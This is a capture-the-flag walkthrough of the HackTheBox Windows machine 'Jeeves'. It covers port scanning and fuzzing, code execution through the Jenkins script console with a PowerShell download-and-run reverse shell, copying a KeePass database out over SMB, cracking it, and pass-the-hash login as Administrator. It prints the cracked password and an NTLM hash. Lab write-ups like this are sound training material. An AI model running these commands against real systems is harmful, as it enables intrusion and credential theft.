---
layout: post
title: "[HTB] Jeeves"
description: "[Machine] - Medium difficulty"
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Medium
---

![Jeeves](/img/htb_img/Jeeves_img/Jeeves.png)

OS: Windows
IP: 10.10.10.63
Complete: Yes
Created time: July 5, 2025 3:38 PM
Level: Medium
Status: Done

# Enumeration

## Nmap Recon

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 15:40 CEST
Initiating SYN Stealth Scan at 15:40
Scanning 10.10.10.63 [65535 ports]
Discovered open port 445/tcp on 10.10.10.63
Discovered open port 135/tcp on 10.10.10.63
Discovered open port 80/tcp on 10.10.10.63
SYN Stealth Scan Timing: About 34.88% done; ETC: 15:42 (0:00:58 remaining)
Discovered open port 50000/tcp on 10.10.10.63
Completed SYN Stealth Scan at 15:41, 79.96s elapsed (65535 total ports)
Nmap scan report for 10.10.10.63
Host is up, received user-set (0.040s latency).
Scanned at 2025-07-05 15:40:32 CEST for 80s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 80.03 seconds
           Raw packets sent: 131127 (5.770MB) | Rcvd: 65 (2.860KB)
```

Four ports open, we continue with a deeper scan.

```bash
❯ nmap -p80,135,445,50000 -sCV -Pn -oN targeted $target                                                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 15:43 CEST
Nmap scan report for 10.10.10.63
Host is up (0.041s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb2-time: 
|   date: 2025-07-05T18:43:38
|_  start_date: 2025-07-05T18:38:13
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.28 seconds
```

We can get some interesting information with this results.

### Identifying OS version.

As we can see, on port 80 there is a Microsoft IIS server, and the nmap scan says it is version 10.0.

If we search this on google, a microsoft official blog explains what OS version is this IIS for:

[Internet Information Services (IIS) - Microsoft Lifecycle](https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis)

![IIS Microsoft Releases](/img/htb_img/Jeeves_img/01.png)

IIS Microsoft Releases

As we can see, this is either a Windows 10 or a Windows Server 2016-2019. More likely a Windows 10 because we see no AD in this machine.

So, Windows 10 it is.

---

## TCP 80 - HTTP IIS

![image.png](/img/htb_img/Jeeves_img/02.png)

Seems like a custom search engine.

![Error at search](/img/htb_img/Jeeves_img/03.png)

Error at search

When searching for something we see a strange error with a `Microsoft SQL Server 2005` error, which is a bit odd taking into consideration that we are in a much newer version of Windows. Hitting CTRL+U to view the source code we can actually see that this “error” is just an image being loaded on the page.

```bash
<img src="jeeves.PNG" width="90%" height="100%">
```

Checking the web form just shows that it redirects to /error.html, so it does nothing.

We should do a bit of directory fuzzing because we have nothing basic showing up.

### Fuzzing TCP 80

```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$target/FUZZ --hh=1245
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.63/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================
```

We get absolutely nothing. We move on to the other port

## TCP 50000 - Jetty

```bash
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the nmap result we can see that this port is hosting a Jetty 9.4.z.

> **Jetty** is a widely used, open-source **web server and servlet container** designed to serve Java-based web applications. By default, Jetty listens on **port 8080**, but this can be configured to any other port, including **port 5000**
> 

But when trying to load it on the browser or curling it, it gives us a `404 Not Found`.

### Fuzzing TCP 50000

```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$target:50000/FUZZ --hw=26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.63:50000/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
=====================================================================

000041593:   302        0 L      0 W        0 Ch        "askjeeves" 
```

So, we have a subdirectory named `askjeeves`  on the port 50000.

[http://10.10.10.63:50000/askjeeves/](http://10.10.10.63:50000/askjeeves/)

![askJeeves](/img/htb_img/Jeeves_img/04.png)

askJeeves

Here we can see that it’s running a Jenkins version 2.87, so we search for it online.

We get nothing too interesting about deserializing vulnerabilities (common in Jenkins), so we move on.

# Foothold

We can execute commands on Jenkins through the script console on `Manage Jenkins` .

![image.png](/img/htb_img/Jeeves_img/05.png)

So, we have command execution.

## Shell as Kohsuke

I will use a reverse powershell from Nishang.

In the groovy script we put:

```bash
cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.X.X/rev.ps1') """
println cmd.execute().text
```

And we set up a listener and the web server hosting the Nishang reverse shell.

```bash
❯ python3 -m http.server 80          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.63 - - [05/Jul/2025 16:41:28] "GET /rev.ps1 HTTP/1.1" 200 -

❯ nc -lvnp 4444                
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.63] 49677
Windows PowerShell running as user kohsuke on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins>
```

### user.txt

```bash
PS C:\Users\Administrator\.jenkins> type C:\Users\kohsuke\Desktop\user.txt
<**REDACTED**>
```

---

# Privilege Escalation

In the documents folder of the user `kohsuke`  we can find a KeePass file.

We need to copy the file outside this machine but we have no python to host a quick server.

I will use smb with impacket.

```bash
❯ impacket-smbserver YourStuffIsMine `pwd`                                                
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

And in the machine we do:

```bash
PS C:\Users\kohsuke\Documents> New-PSDrive -Name "GetAllFromMe" -PSProvider "FileSystem" -Root "\\10.10.X.X\YourStuffIsMine"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
GetAllF...                             FileSystem    \\10.10.X.X\YourStuffIsMine                                     

PS C:\Users\kohsuke\Documents> 
```

So we have mounted the filesystem, and we can cd into “GetAllFromMe”.

We try creating a simple file and reading it on our attacker’s machine.

```bash
    Directory: C:\Users\kohsuke\Documents

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              

PS C:\Users\kohsuke\Documents> cd GetAllFromMe:

PS GetAllFromMe:\> echo hello > test.txt
PS GetAllFromMe:\> dir

    Directory: \\10.10.X.X\YourStuffIsMine

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         7/5/2025  10:53 AM             16 test.txt 

❯ cat test.txt 
───────┬───────────────────────────────────────────────────
       │ File: test.txt   <UTF-16LE>
───────┼───────────────────────────────────────────────────
   1   │ hello
───────┴───────────────────────────────────────────────────
```

I will copy the keepass file.

```bash
PS GetAllFromMe:\> cp C:\Users\kohsuke\Documents\CEH.kdbx .
PS GetAllFromMe:\> dir

    Directory: \\10.10.X.X\YourStuffIsMine

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              
-a----         7/5/2025  10:53 AM             16 test.txt  
```

So, we can crack it on our machine.

```bash
❯ keepass2john CEH.kdbx > hash
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

And crack it with `John` or `hashcat`.

```bash
❯ sudo john -w=/usr/share/wordlists/rockyou.txt hash                           
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**moonshine1**       (CEH)     
1g 0:00:00:23 DONE (2025-07-05 16:56) 0.04191g/s 2304p/s 2304c/s 2304C/s nando1..molly21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the password is `moonshine1`.

![KeePass](/img/htb_img/Jeeves_img/06.png)

KeePass

The only interesting one is Backup stuff and DC Recovery

```bash
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

S1TjAtJHKsugh9oC4VZl
```

One seems like an NTLM hash and the other a password, i will try them.

With `winexe` I try logging in with password and username:

```bash
❯ pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe 
Password for [JENKINS\administrator]:
E_md4hash wrapper called.
```

Not working, gonna try the NTLM hash, this time with `pth-winexe`:

```bash
❯ pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
Password for [JENKINS\administrator]:
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

But the root is not in root.txt on the Desktop directory.

If we type the following, we can see an alternate data stream on the file.

```bash
C:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
```

### root.txt

So, with powershell we can check the Stream data of a file:

```bash
C:\Users\Administrator\Desktop>powershell (Get-Content hm.txt -Stream root.txt)
powershell (Get-Content hm.txt -Stream root.txt)
<**REDACTED**>
```

And we are in.

<aside>
🔥

Pwned!!

</aside>
